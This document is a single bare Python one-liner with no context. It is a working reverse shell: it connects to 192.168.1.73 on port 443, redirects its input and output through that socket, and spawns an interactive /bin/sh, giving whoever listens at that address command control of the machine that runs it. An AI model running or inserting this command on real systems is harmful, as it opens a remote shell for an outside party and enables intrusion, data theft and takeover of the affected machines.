python3 -c "import socket,os,pty;s=socket.socket();s.connect(('192.168.1.73',443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/sh')"
